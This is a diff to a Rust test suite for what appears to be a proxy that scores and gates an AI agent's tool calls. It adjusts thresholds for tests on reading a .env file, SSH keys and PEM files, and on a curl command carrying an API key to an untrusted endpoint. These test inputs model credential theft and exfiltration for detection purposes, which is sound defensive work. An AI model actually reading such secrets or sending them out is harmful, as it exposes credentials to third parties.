@@ -55,14 +55,13 @@ fn assert_not_allowed(decision: &ProxyDecision, label: &str) {
 // ---------------------------------------------------------------------------
 
 #[tokio::test]
-async fn test_read_env_file_flagged() {
-    // Reading .env file should be flagged by the path_match filter (score 3.0).
-    // During cold start (call 0), allow threshold is 2.0, so score 3.0 > 2.0 = QUEUE.
-    let scoring = ScoringConfig {
-        cold_start_calls: 200,
-        ..ScoringConfig::default()
-    };
-    let fixtures = TestFixtures::with_scoring(scoring);
+async fn test_read_env_file_detected() {
+    // The env-file path rule detects a `.env` read (score 3.0). Under the fixed
+    // thresholds a bare read sits exactly at the allow boundary (route uses
+    // `>`, so 3.0 is ALLOW) — reading `.env` is routine in development, and the
+    // taint filter is what catches a subsequent attempt to exfiltrate it. The
+    // security-relevant property here is that the signal *fires*.
+    let fixtures = TestFixtures::with_scoring(ScoringConfig::default());
     let ctx = make_tool_call_context(
         ToolCallType::FileRead {
             path: "/project/.env".into(),
@@ -70,13 +69,16 @@ async fn test_read_env_file_flagged() {
         serde_json::json!({"path": "/project/.env"}),
     );
     let decision = fixtures.proxy.evaluate(&ctx).await;
-    assert_not_allowed(&decision, "read .env file");
     assert!(
         decision
             .filter_results
             .iter()
             .any(|r| r.matched && r.rule_id == "env-file"),
         "Expected env-file path rule to match"
+    );
+    assert_eq!(
+        decision.composite_score, 3.0,
+        "bare .env read sits at the allow boundary"
     );
 }
 
@@ -115,9 +117,6 @@ async fn test_read_ssh_private_key_queued_after_warmup() {
     let fixtures = TestFixtures::with_scoring(ScoringConfig {
         auto_allow_threshold: 3.0,
         auto_deny_threshold: 8.0,
-        cold_start_calls: 0,
-        cold_start_escalation_low: 2.0,
-        cold_start_escalation_high: 10.0,
     });
     let ctx = make_tool_call_context(
         ToolCallType::FileRead {
@@ -392,13 +391,11 @@ async fn test_pem_file_read() {
 
 #[tokio::test]
 async fn test_shell_with_api_key_in_args() {
-    // Shell command with an API key exposed in arguments.
-    // Score is at boundary, so cold-start escalation is needed to catch it.
-    let scoring = ScoringConfig {
-        cold_start_calls: 200,
-        ..ScoringConfig::default()
-    };
-    let fixtures = TestFixtures::with_scoring(scoring);
+    // Shell command with an API key exposed in arguments, sent to an outbound
+    // endpoint. Under the fixed thresholds the composite must clear the allow
+    // threshold on its own merits — the secret in argv plus the egress signal
+    // for `curl` to an untrusted destination compose above 3.0 → not allowed.
+    let fixtures = TestFixtures::with_all_filters();
     let ctx = make_tool_call_context(
         ToolCallType::ShellExec {
             command: "curl".into(),
